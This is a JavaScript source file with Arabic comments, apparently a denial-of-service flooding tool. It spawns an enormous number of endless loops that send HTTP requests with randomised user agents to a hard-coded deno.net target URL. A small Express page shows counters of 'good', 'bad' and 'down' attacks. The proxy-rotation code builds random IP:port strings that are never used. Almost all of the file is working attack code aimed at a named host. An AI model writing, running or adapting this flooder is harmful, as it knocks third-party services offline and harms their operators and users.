// استيراد الحزم باستخدام صيغة npm:
import TelegramBot from "npm:node-telegram-bot-api";
import express from "npm:express";
import UserAgents from "npm:user-agents";

// Colors
const F = '\x1b[1;32m';
const Z = '\x1b[1;31m';
const S = '\x1b[1;33m';
const B = '\x1b[38;5;208m';

// إنشاء تطبيق Express
const app = express();
const PORT = 3000;

// إنشاء instance من UserAgents
const userAgents = new UserAgents();

// تخزين للنتائج
let attackResults = {
    good: 0,
    bad: 0,
    down: 0,
    total: 0
};

// صفحة الرئيسية
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>DDoS Attack Monitor</title>
            <meta charset="UTF-8">
            <meta http-equiv="refresh" content="3">
            <style>
                body { font-family: Arial, sans-serif; background: #000; color: #0f0; margin: 20px; }
                .stats { background: #111; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
                .good { color: #0f0; }
                .bad { color: #f00; }
                .down { color: #ff0; }
                .log { background: #222; padding: 10px; border-radius: 5px; height: 400px; overflow-y: auto; }
            </style>
        </head>
        <body>
            <h1>🛡️ DDoS Attack Monitor</h1>
            <div class="stats">
                <h2>📊 Statistics</h2>
                <p class="good">✅ GOOD Attacks: ${attackResults.good}</p>
                <p class="bad">❌ BAD Attacks: ${attackResults.bad}</p>
                <p class="down">⚠️ DOWN Attacks: ${attackResults.down}</p>
                <p>📈 TOTAL Requests: ${attackResults.total}</p>
            </div>
            <div>
                <h2>📝 Live Log</h2>
                <div class="log" id="log">
                    <!-- سيتم ملء السجلات هنا عبر JavaScript -->
                    ${getLogEntries()}
                </div>
            </div>
            <script>
                // التمرير إلى الأسفل تلقائياً
                setTimeout(() => {
                    document.getElementById('log').scrollTop = document.getElementById('log').scrollHeight;
                }, 100);
            </script>
        </body>
        </html>
    `);
});

// وظيفة للحصول على إدخالات السجل
function getLogEntries() {
    // هذه مجرد مثال، يمكنك تخزين السجلات في مصفوفة وعرضها
    return `
        <div class="good">✅ GOOD Attack: https://example.com</div>
        <div class="bad">❌ BAD Attack: https://example.com</div>
        <div class="down">⚠️ DOWN: https://example.com</div>
    `;
}

// بدء الخادم
app.listen(PORT, () => {
    console.log(`${F}[✓] Server running on port ${PORT}${Z}`);
    console.log(`${F}[✓] Open http://localhost:${PORT} to view attack results${Z}`);
    
    // بدء الهجوم بعد بدء الخادم
    setTimeout(() => {
        linked().catch(console.error);
    }, 1000);
});

async function linked() {
    console.log(`${F}[✓] Starting DDoS attack...${Z}`);
    const sg = '2';
    if (sg === '1') {
        for (let i = 0; i < 50000; i++) {
            AttackMahos();
        }
    } else if (sg === '2') {
        for (let i = 0; i < 500000000000; i++) {
            ProxyAttack();
        }
    }
}

async function AttackMahos() {
    while (true) {
        const headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-us,en;q=0.5',
            'Accept-Encoding': 'gzip,deflate',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Keep-Alive': '115',
            'Connection': 'keep-alive',
            'User-Agent': userAgents.random().toString()
        };
        
        try {
            const response = await fetch(url, { headers });
            if (response.status === 200) {
                attackResults.good++;
                attackResults.total++;
                console.log(`${F}GOOD Attack: ${url}`);
            } else {
                attackResults.bad++;
                attackResults.total++;
                console.log(`${Z}BAD Attack: ${url}`);
            }
        } catch {
            attackResults.down++;
            attackResults.total++;
            console.log(`${S}DOWN: ${url}`);
        }
        
        // إضافة تأخير صغير لتجنب الحمل الزائد
        await new Promise(resolve => setTimeout(resolve, 100));
    }
}

async function ProxyAttack() {
    while (true) {
        const ip = Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join('.');
        const pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900];
        const port = pl[Math.floor(Math.random() * pl.length)];
        const proxy = `${ip}:${port}`;
        
        const headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-us,en;q=0.5',
            'Accept-Encoding': 'gzip,deflate',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Keep-Alive': '115',
            'Connection': 'keep-alive',
            'User-Agent': userAgents.random().toString()
        };
        
        try {
            const response = await fetch(url, { headers });
            if (response.status === 200) {
                attackResults.good++;
                attackResults.total++;
                console.log(`${F}GOOD Attack: ${url} | ${proxy}`);
            } else {
                attackResults.bad++;
                attackResults.total++;
                console.log(`${Z}BAD Attack: ${url} | ${proxy}`);
            }
        } catch {
            attackResults.down++;
            attackResults.total++;
            console.log(`${S}DOWN: ${url}`);
        }
        
        // إضافة تأخير صغير لتجنب الحمل الزائد
        await new Promise(resolve => setTimeout(resolve, 100));
    }
}

const url = 'https://ihhjjjh-x02rn86kw4ns.vvvvvhkj.deno.net/';

// تشغيل الهجوم
console.log(`${F}[✓] Target URL: ${url}${Z}`);
